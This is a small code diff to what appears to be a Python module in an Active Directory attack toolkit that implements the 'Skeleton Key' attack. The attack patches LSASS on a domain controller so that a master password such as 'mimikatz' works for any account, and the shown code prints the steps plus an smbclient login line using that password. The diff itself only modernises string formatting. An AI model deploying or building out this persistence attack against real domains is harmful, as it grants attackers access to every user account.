@@ -1,5 +1,4 @@
 """Skeleton Key — inject master password into LSASS on DC."""
-from __future__ import annotations
 import sys
 from typing import Any
 from adxpl.core.credential import ADCredential
@@ -19,7 +18,7 @@ def run(args: Any) -> int:
     target = args.target
     master_password = getattr(args, "skeleton_password", "mimikatz")
 
-    print("[*] Skeleton Key injection → {} (password: {})".format(target, master_password))
+    print(f"[*] Skeleton Key injection → {target} (password: {master_password})")
     print("[!] WARNING: This modifies LSASS on the DC — use with caution")
     print("[!] Skeleton Key persists until DC reboot")
 
@@ -40,6 +39,6 @@ def run(args: Any) -> int:
     print("  - Patch LSASS CryptProtectData to accept master key")
     print()
     print("[*] After injection, authenticate as ANY user with:")
-    print("  Password: {}".format(master_password))
-    print("  smbclient //{}/ -U '{}\\any_user%{}'".format(target, cred.domain, master_password))
+    print(f"  Password: {master_password}")
+    print(f"  smbclient //{target}/ -U '{cred.domain}\\any_user%{master_password}'")
     return 0
